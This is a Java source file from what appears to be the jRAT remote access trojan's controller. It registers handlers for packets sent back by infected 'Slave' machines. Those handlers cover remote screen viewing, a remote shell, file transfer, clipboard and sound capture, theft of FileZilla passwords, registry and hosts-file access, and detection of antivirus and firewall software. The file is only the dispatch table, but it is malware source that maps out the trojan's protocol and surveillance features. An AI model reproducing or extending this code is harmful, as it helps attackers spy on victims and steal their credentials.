package se.jrat.client.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.client.Slave;
import se.jrat.client.addons.PluginEventHandler;
import se.jrat.common.PacketRange;


public class IncomingPackets {

	private static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	public static HashMap<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();
		incomingPackets.put(/* "LOCALE" */(byte) 10, Packet10InitDefaultLocale.class);
		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, Packet11InstalledLocales.class);
		incomingPackets.put(/* "DISCONNECT" */(byte) 12, Packet12Disconnect.class);
		incomingPackets.put(/* "STAT" */(byte) 13, Packet13Status.class);
		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, Packet14InitComputerName.class);
		incomingPackets.put(/* "SERVERID" */(byte) 15, Packet15InitServerID.class);
		incomingPackets.put(/* "OSNAME" */(byte) 16, Packet16InitOperatingSystem.class);
		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, Packet17RemoteScreen.class);
		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, Packet18OneRemoteScreen.class);
		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, Packet19ListFiles.class);
		incomingPackets.put(/* "PROCESS" */(byte) 20, Packet20Process.class);
		incomingPackets.put(/* "CMD" */(byte) 21, Packet21RemoteShell.class);
		incomingPackets.put(/* "USERNAME" */(byte) 22, Packet22InitUsername.class);
		incomingPackets.put(/* "SERVERPATH" */(byte) 23, Packet23InitInstallPath.class);
		incomingPackets.put(/* "HERERAM" */(byte) 24, Packet24JVMMemory.class);
		incomingPackets.put(/* "JAVAVER" */(byte) 25, Packet25InitJavaVersion.class);
		incomingPackets.put(/* "JAVAPATH" */(byte) 26, Packet26InitJavaPath.class);
		incomingPackets.put(/* "URLSTAT" */(byte) 27, Packet27URLStatus.class);
		incomingPackets.put(/* "LOCALIP" */(byte) 28, Packet28InitLanAddress.class);
		incomingPackets.put(/* "FILE" */(byte) 29, Packet29ReceiveFile.class);
		incomingPackets.put(/* "VERSION" */(byte) 30, Packet30InitVersion.class);
		incomingPackets.put(/* "DATE" */(byte) 31, Packet31InitInstallationDate.class);
		incomingPackets.put(/* "VARPROP" */(byte) 32, Packet32SystemProperties.class);
		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, Packet33Thumbnail.class);
		incomingPackets.put(/* "DIR" */(byte) 34, Packet34CustomDirectory.class);
		incomingPackets.put(/* "CHAT" */(byte) 35, Packet35ChatMessage.class);
		incomingPackets.put((byte) 36, Packet36Initialized.class);
		incomingPackets.put(/* "FF" */(byte) 37, Packet37SearchResult.class);
		incomingPackets.put(/* "HOSTF" */(byte) 38, Packet38HostFile.class);
		incomingPackets.put(/* "HOSTANSW" */(byte) 39, Packet39HostEditResult.class);
		incomingPackets.put(/* "UTOR" */(byte) 40, Packet40UTorrentDownload.class);
		incomingPackets.put(/* "CBOARDC" */(byte) 41, Packet41Clipboard.class);
		incomingPackets.put(/* "FC" */(byte) 42, Packet42PreviewFile.class);
		incomingPackets.put(/* "IC" */(byte) 43, Packet43PreviewImage.class);
		incomingPackets.put(/* "JVM" */(byte) 44, Packet44SystemJavaProperty.class);
		incomingPackets.put(/* "ZIP" */(byte) 45, Packet45ArchivePreview.class);
		incomingPackets.put(/* "MD5" */(byte) 46, Packet46FileHash.class);
		incomingPackets.put(/* "COUNTRY" */(byte) 47, Packet47InitCountry.class);
		incomingPackets.put(/* "FZ" */(byte) 48, Packet48FileZillaPassword.class);
		incomingPackets.put(/* "LAN" */(byte) 49, Packet49LanDevices.class);
		incomingPackets.put(/* "IPC" */(byte) 50, Packet50IPConfig.class);
		incomingPackets.put(/* "APORT" */(byte) 51, Packet51ActivePort.class);
		incomingPackets.put(/* "WINSER" */(byte) 52, Packet52WindowsService.class);
		incomingPackets.put(/* "REGSTART" */(byte) 53, Packet53RegistryStartup.class);
		incomingPackets.put(/* "REG" */(byte) 54, Packet54Registry.class);
		incomingPackets.put(/* "INSTPROG" */(byte) 55, Packet55InstalledProgram.class);
		incomingPackets.put(/* "ADAPT" */(byte) 56, Packet56NetworkAdapter.class);
		incomingPackets.put(/* "RAWINFO" */(byte) 57, Packet57RawComputerInfo.class);
		incomingPackets.put(/* "SO" */(byte) 58, Packet58SoundCapture.class);
		incomingPackets.put(/* "IMGLIST" */(byte) 59, Packet59ThumbnailPreview.class);
		incomingPackets.put(/* "ERROR" */(byte) 60, Packet60Error.class);
		incomingPackets.put(/* "MONITOR" */(byte) 61, Packet61InitMonitors.class);
		incomingPackets.put(/* "DRIVES" */(byte) 62, Packet62InitDrives.class);
		incomingPackets.put(/* "RAM" */(byte) 63, Packet63InitRAM.class);
		incomingPackets.put(/* "APS" */(byte) 64, Packet64InitAvailableProcessors.class);
		incomingPackets.put(/* "ERRLOG" */(byte) 65, Packet65ErrorLog.class);
		incomingPackets.put(/* "CONFIG" */(byte) 66, Packet66Config.class);
		incomingPackets.put(/* "PLUGIN" */(byte) 67, Packet67LoadedPlugins.class);
		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);
		incomingPackets.put((byte) 69, Packet69InitAntivirus.class);
		incomingPackets.put((byte) 70, Packet70InitFirewall.class);
		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
	}

	public static boolean execute(byte header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();

			for (Byte str : set) {
				if (str == header) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}

			if (header >= 0 && header <= PacketRange.incomingRange) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}